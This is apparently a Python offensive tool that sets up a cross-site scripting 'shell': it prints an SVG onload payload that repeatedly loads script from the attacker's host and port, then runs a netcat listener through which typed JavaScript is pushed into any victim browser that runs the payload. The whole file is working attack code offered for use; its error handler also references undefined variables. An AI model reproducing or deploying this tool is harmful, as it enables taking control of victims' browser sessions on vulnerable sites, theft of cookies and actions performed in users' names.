#!/usr/bin/env python3
import socket
import os
import time
import colorama
import sys
from subprocess import Popen,PIPE,STDOUT,call 
from colorama import init

init()

if sys.version_info < (3, 0):
    input = raw_input

white = '\033[1;97m'
green = '\033[1;32m'
red = '\033[1;31m'
yellow = '\033[1;33m'
end = '\033[1;m'
info = '\033[1;33m[!]\033[1;m'
que =  '\033[1;34m[?]\033[1;m'
bad = '\033[1;31m[-]\033[1;m'
good = '\033[1;32m[+]\033[1;m'
run = '\033[1;97m[~]\033[1;m'

print('''%s
                                                                                            

   ▄▄▄▄▀ ▄███▄   █▄▄▄▄ █▄▄▄▄ ████▄ █▄▄▄▄ 
▀▀▀ █    █▀   ▀  █  ▄▀ █  ▄▀ █   █ █  ▄▀ 
    █    ██▄▄    █▀▀▌  █▀▀▌  █   █ █▀▀▌  
   █     █▄   ▄▀ █  █  █  █  ▀████ █  █  
  ▀      ▀███▀     █     █           █   
                  ▀     ▀           ▀    
                                        

''' % red)
o = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
o.connect(("8.8.8.8", 80))
LH = o.getsockname()[0]
o.close()

userinput = input('%s %s%s%s : Want to use the default LHOST? [Y or N] ' % (que, red, LH, end)).lower()
if userinput == 'n':
    LH = input('%s ENTER YOUR CUSTOM LHOST:- ' % que)
LP = '6969'
userinput = input('%s %s%s%s : Want to use the default LPORT? [Y or N] ' % (que, red, LP, end)).lower()
if userinput == 'n':
    LP = input('%s ENTER YOUR CUSTOM LPORT:- ' % que)
print(' ')
print(' =======================================')
print('       PASTE YOUR FVCK!NQ P4YL04D' )
print(' =======================================')
print('           | | | | | | | | | ')
print('           v v v v v v v v v')
print(' ')
brutelogicpayload = '<svg/onload=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//%s:%s"},100);>\n' % (LH, LP)
print(brutelogicpayload)
print('%s Execution Pending....' % run)

def shell():
    os.system('printf "\033[F\033[0;31m$\033[0m "; read c; echo "$c" | timeout 1 nc -lp %s >/dev/null;' % LP)
    shell()

def status():
    proc=Popen('timeout 1 nc -lp %s' % LP, shell=True, stdout=PIPE, )
    response = str(proc.communicate()[0])
    if 'Accept' in response:
        print(response.replace('\\r\\n', '\n').replace('b\'', '')[:-3])
        print('\n%s Executed. XSS Payload Here [ex. prompt(document.domain) ]:- \n\n' % good)
        shell()
    else:
        os.system('printf "\033[F"')
        time.sleep(2)
        status()

status()

try:
	status()
	shell()
except KeyboardInterrupt:
	print('\n' + R + '[!]' + C + ' Keyboard Interrupt.' + W)
	exit()
